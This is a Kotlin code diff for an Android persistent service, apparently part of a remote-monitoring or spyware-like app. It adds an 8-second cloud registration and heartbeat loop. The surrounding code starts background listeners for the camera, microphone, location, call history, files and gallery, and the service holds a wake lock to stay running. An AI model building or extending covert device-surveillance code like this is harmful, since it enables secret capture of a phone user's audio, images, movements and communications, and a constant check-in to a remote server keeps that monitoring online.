@@ -11,10 +11,31 @@ import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
 import androidx.core.app.NotificationCompat
+import kotlinx.coroutines.*
 
 class SentryPersistentService : Service() {
 
     private var wakeLock: PowerManager.WakeLock? = null
+
+    private var cloudHeartbeatJob: Job? = null
+    private val serviceScope = CoroutineScope(Dispatchers.IO)
+
+    private fun startCloudHeartbeatLoop() {
+        if (cloudHeartbeatJob?.isActive == true) return
+        cloudHeartbeatJob = serviceScope.launch {
+            val client = com.example.sentry.network.SentryApiClient(applicationContext)
+            while (isActive) {
+                try {
+                    client.registerDevice()
+                    client.sendHeartbeat()
+                    android.util.Log.d("SentryPersistentService", "Cloud presence heartbeat synced • Device ONLINE")
+                } catch (e: Exception) {
+                    android.util.Log.w("SentryPersistentService", "Cloud heartbeat error: ${e.message}")
+                }
+                delay(8000) // 8s heartbeat keeps cloud status ONLINE continuously
+            }
+        }
+    }
 
     override fun onCreate() {
         super.onCreate()
@@ -30,7 +51,8 @@ class SentryPersistentService : Service() {
         } catch (_: Exception) {
         }
 
-        // Start background Camera2, Microphone, Battery Telemetry, File Explorer, Location, Call History, and Gallery listeners
+        // Start cloud heartbeat and background listeners
+        startCloudHeartbeatLoop()
         BackgroundCameraManager.startListening(applicationContext)
         BackgroundAudioManager.startListening(applicationContext)
         BatteryTelemetryManager.startSync(applicationContext)
@@ -42,7 +64,8 @@ class SentryPersistentService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // Re-ensure background listeners are active
+        // Re-ensure cloud heartbeat and listeners are active
+        startCloudHeartbeatLoop()
         BackgroundCameraManager.startListening(applicationContext)
         BackgroundAudioManager.startListening(applicationContext)
         BatteryTelemetryManager.startSync(applicationContext)
